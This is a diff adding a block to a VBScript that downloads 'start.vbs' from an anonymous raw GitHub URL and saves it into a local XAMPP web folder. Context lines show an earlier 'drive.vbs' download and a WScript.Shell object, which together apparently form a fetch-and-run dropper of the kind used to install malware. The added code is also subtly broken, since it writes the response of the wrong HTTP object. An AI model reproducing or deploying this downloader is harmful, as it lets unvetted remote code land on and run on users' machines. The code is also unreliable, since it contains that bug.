@@ -30,6 +30,21 @@ with bbStrm
 .write xbHttp.responseBody
 .savetofile "c:\xampplite\htdocs\drive.vbs", 2
 end with
+
+
+
+dim xeHttp: Set xeHttp = createobject("Microsoft.XMLHTTP")
+dim beStrm: Set beStrm = createobject("Adodb.Stream")
+xeHttp.Open "GET", "https://raw.githubusercontent.com/anobodya/a/master/start.vbs", False
+xeHttp.Send
+with beStrm
+.type = 1
+.open
+.write xbHttp.responseBody
+.savetofile "c:\xampplite\htdocs\start.vbs", 2
+end with
+
+
 WScript.Sleep 1000
 Dim WshShell
 Set WshShell = WScript.CreateObject ("WScript.Shell")
